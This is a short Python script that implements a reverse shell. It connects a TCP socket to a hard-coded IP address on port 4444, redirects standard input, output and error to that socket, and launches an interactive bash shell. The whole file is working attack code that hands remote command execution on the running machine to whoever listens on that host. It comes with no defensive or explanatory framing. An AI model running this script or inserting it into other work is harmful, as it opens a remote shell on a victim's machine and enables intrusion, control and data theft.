import socket
import subprocess
import os

# Define the target IP and Port
TARGET_IP = "172.26.233.12"
TARGET_PORT = 4444

try:
    # 1. Create and connect the socket
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((TARGET_IP, TARGET_PORT))

    print(f"Successfully connected to {TARGET_IP}:{TARGET_PORT}")

    # 2. Redirect standard file descriptors (stdin, stdout, stderr) 
    # to the socket's file descriptor.
    os.dup2(s.fileno(), 0) # stdin is redirected to socket
    os.dup2(s.fileno(), 1) # stdout is redirected to socket
    os.dup2(s.fileno(), 2) # stderr is redirected to socket

    # 3. Execute bash
    # subprocess.call runs the command and waits for it to finish.
    print("Starting interactive shell...")
    subprocess.call(["/bin/bash", "-i"])

except ConnectionRefusedError:
    print(f"Error: Connection refused by {TARGET_IP} on port {TARGET_PORT}.")
except Exception as e:
    print(f"An unexpected error occurred: {e}")